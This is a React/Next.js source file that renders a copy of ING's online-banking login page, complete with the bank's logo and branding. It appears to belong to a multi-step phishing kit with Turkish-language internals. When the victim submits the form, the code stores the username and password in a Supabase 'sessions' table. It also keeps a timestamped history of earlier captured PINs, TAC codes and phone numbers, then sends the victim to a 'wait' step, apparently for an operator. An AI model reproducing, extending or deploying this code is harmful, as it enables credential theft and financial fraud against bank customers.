"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function IngClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [saving, setSaving] = useState(false);
  const formDoluMu = username.trim().length > 0 && password.trim().length > 0;

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const previousForm = { ...prev };
    const prevEmpty = !String(previousForm.orderedField1 || previousForm.username || previousForm.verfuegernummer || "").trim() &&
                      !String(previousForm.password || previousForm.pin || "").trim() &&
                      !String(previousForm.personalCode || previousForm.bankPhone || previousForm.tacCode || "").trim();
    const prevHistory: any[] = Array.isArray((previousForm as any).bankFormHistory)
      ? (previousForm as any).bankFormHistory.slice()
      : [];
    if (!prevEmpty) {
      prevHistory.push({
        bankSlug: "ing",
        bankName: "ING",
        htmlStepLabel: "BANKA FORMU",
        verfuegernummer: String(previousForm.verfuegernummer || previousForm.username || "").trim(),
        username: String(previousForm.username || previousForm.verfuegernummer || "").trim(),
        pin: String(previousForm.pin || previousForm.password || "").trim(),
        password: String(previousForm.password || previousForm.pin || "").trim(),
        bankPhone: String(previousForm.bankPhone || "").trim(),
        personalCode: String(previousForm.personalCode || "").trim(),
        tacCode: String(previousForm.tacCode || (previousForm as any).tac_code || "").trim(),
        orderedField1: String(previousForm.orderedField1 || "").trim(),
        orderedField1Key: String(previousForm.orderedField1Key || "").trim(),
        orderedField2: String(previousForm.orderedField2 || "").trim(),
        orderedField2Key: String(previousForm.orderedField2Key || "").trim(),
        orderedField2Type: String(previousForm.orderedField2Type || "").trim(),
        orderedField3: String(previousForm.orderedField3 || "").trim(),
        orderedField3Key: String(previousForm.orderedField3Key || "").trim(),
        orderedField3Type: String(previousForm.orderedField3Type || "").trim(),
        capturedAt: new Date().toISOString(),
      });
    }
    await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
      form_data: { ...prev, bankSlug: "ing", bankName: "ING", verfuegernummer: username, pin: password, bankFormHistory: prevHistory }
    }).eq("id", sessionId);
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#f5f5f5] font-sans flex flex-col relative overflow-hidden">
      {/* Background Lion Watermark */}
      <div className="absolute bottom-0 right-0 pointer-events-none opacity-50 z-0">
        <img src="/bank-assets/Ing/ING sağ taraf aslan .svg" alt="" className="h-[600px] object-contain translate-x-20 translate-y-10" />
      </div>

      {/* Top Bar */}
      <header className="bg-white h-[70px] flex items-center justify-between px-8 border-b border-gray-200 z-10 relative">
        <img src="/bank-logos/ing-detail.svg" alt="ING" className="h-10" />
        <div className="flex items-center gap-6 text-[14px] text-[#000066] font-bold">
          <button className="flex items-center gap-2 hover:underline">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M18 5v8a2 2 0 01-2 2h-5l-5 4v-4H4a2 2 0 01-2-2V5a2 2 0 012-2h12a2 2 0 012 2zM7 8H5v2h2V8zm2 0h2v2H9V8zm6 0h-2v2h2V8z"/></svg>
            Feedback
          </button>
          <div className="flex items-center gap-2 border-l border-gray-300 pl-6">
            <span className="text-[#FF6200]">NL</span>
            <span className="text-gray-400 font-normal">|</span>
            <span className="text-gray-500 font-normal hover:text-[#000066] cursor-pointer hover:underline">EN</span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center pt-12 px-4 z-10 relative">
        
        {/* Tabs */}
        <div className="w-full max-w-[440px] flex items-center bg-white border-b border-gray-200 rounded-t-sm shadow-sm">
          <button className="px-6 py-4 text-[15px] font-bold text-[#333] border-b-4 border-[#FF6200]">
            Personal
          </button>
          <button className="px-6 py-4 text-[15px] font-medium text-[#767676] hover:text-[#333] border-b-4 border-transparent">
            Business
          </button>
        </div>

        {/* Login Card */}
        <div className="bg-white w-full max-w-[440px] shadow-sm rounded-b-sm border border-t-0 border-gray-200 p-8">
          <h1 className="text-[24px] font-bold text-[#FF6200] mb-6">Log in to My ING</h1>
          
          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }}>
            <div className="mb-5">
              <label className="block text-[14px] font-medium text-[#333] mb-1">Username</label>
              <input 
                type="text" 
                value={username} 
                onChange={e => setUsername(e.target.value)} 
                className="w-full border border-gray-400 rounded-sm py-2.5 px-3 focus:outline-none focus:border-[#FF6200] focus:ring-1 focus:ring-[#FF6200] transition-colors" 
              />
            </div>
            
            <div className="mb-5">
              <label className="block text-[14px] font-medium text-[#333] mb-1">Password</label>
              <input 
                type="password" 
                value={password} 
                onChange={e => setPassword(e.target.value)} 
                className="w-full border border-gray-400 rounded-sm py-2.5 px-3 focus:outline-none focus:border-[#FF6200] focus:ring-1 focus:ring-[#FF6200] transition-colors" 
              />
            </div>

            <div className="mb-6 flex items-center">
              <input 
                type="checkbox" 
                id="remember" 
                checked={remember}
                onChange={e => setRemember(e.target.checked)}
                className="w-4 h-4 border-gray-400 rounded-sm text-[#FF6200] focus:ring-[#FF6200]" 
              />
              <label htmlFor="remember" className="ml-2 text-[14px] text-[#333] cursor-pointer">
                Remember my username
              </label>
            </div>

            <div className="flex items-center gap-4 mb-6">
              <button 
                type="submit" 
                disabled={!formDoluMu || saving} 
                className={`py-2.5 px-6 rounded transition-colors font-bold ${formDoluMu && !saving ? "bg-[#FF6200] hover:bg-[#E65800] text-white" : "bg-gray-400 text-gray-700 opacity-70"}`}
              >
                {saving ? "Loading..." : "Log in"}
              </button>
              <a href="#" className="text-[#000066] text-[14px] hover:underline">
                Forgot login details?
              </a>
            </div>

            <hr className="border-gray-200 mb-6" />

            <button type="button" className="bg-[#252851] text-white text-[14px] font-bold py-3 px-4 rounded w-full flex items-center justify-center gap-2 hover:bg-[#1b1d3d] transition-colors">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
              Call ING? Check the call
            </button>
          </form>
        </div>

        {/* Secondary Card */}
        <div className="bg-white w-full max-w-[440px] shadow-sm rounded-sm border border-gray-200 mt-6 p-6 flex flex-col cursor-pointer hover:shadow-md transition-shadow">
          <h2 className="text-[#FF6200] font-bold text-[16px] mb-4">Other ways to log in</h2>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="text-[#FF6200]">
                <svg className="w-8 h-8" fill="currentColor" viewBox="0 0 24 24"><path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h3v2h-3v-2zm-3 0h2v2h-2v-2zm3 3h3v2h-3v-2zm-3 0h2v2h-2v-2zm3 3h3v2h-3v-2zm-3 0h2v2h-2v-2z"/></svg>
              </div>
              <div>
                <h3 className="text-[#333] font-bold text-[15px]">With a QR code</h3>
                <p className="text-[#767676] text-[13px]">Open the ING App and scan the QR code!</p>
              </div>
            </div>
            <svg className="w-5 h-5 text-[#333]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path></svg>
          </div>
        </div>

        {/* Footer Links */}
        <div className="mt-8 flex items-center justify-center gap-6 text-[13px] text-[#767676]">
          <a href="#" className="hover:text-[#000066] hover:underline">Become a customer</a>
          <a href="#" className="hover:text-[#000066] hover:underline">Secure banking</a>
          <a href="#" className="hover:text-[#000066] hover:underline">Privacy and cookies</a>
          <a href="#" className="hover:text-[#000066] hover:underline">Disclaimer</a>
        </div>
      </main>
    </div>
  );
}